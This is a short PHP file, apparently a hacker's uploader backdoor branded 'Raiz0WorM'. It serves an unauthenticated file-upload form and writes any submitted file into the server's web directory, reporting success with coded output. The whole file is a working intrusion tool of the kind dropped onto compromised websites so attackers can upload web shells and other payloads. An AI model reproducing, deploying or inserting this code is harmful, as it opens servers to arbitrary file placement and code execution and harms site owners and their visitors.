<?php
echo 'Raiz0WorM<br/><form action="" method="post" enctype="multipart/form-data" name="uploader"><input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="U"></form>';
if( $_POST['_upl'] == "U" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '#1~'; }
else { echo '#0~'; }
}
?>